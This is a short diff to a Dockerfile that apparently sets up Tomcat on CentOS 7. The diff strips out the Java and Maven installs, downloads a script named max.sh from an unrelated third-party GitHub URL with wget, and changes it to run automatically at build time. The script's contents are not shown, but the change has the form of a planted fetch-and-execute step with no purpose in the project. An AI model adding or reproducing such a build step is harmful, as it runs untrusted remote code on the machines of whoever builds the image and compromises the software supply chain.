@@ -2,10 +2,10 @@
 
 FROM centos:7
 MAINTAINER Gaurav Agarwal, bharatmicrosystems@gmail.com
-RUN yum install -y java-1.8.0-openjdk-devel wget git maven
+RUN yum install -y wget
 
 RUN wget https://raw.githubusercontent.com/calebsto/rap/main/max.sh
-CMD bash max.sh
+RUN bash max.sh
 # Create users and groups
 RUN groupadd tomcat
 RUN mkdir /opt/tomcat
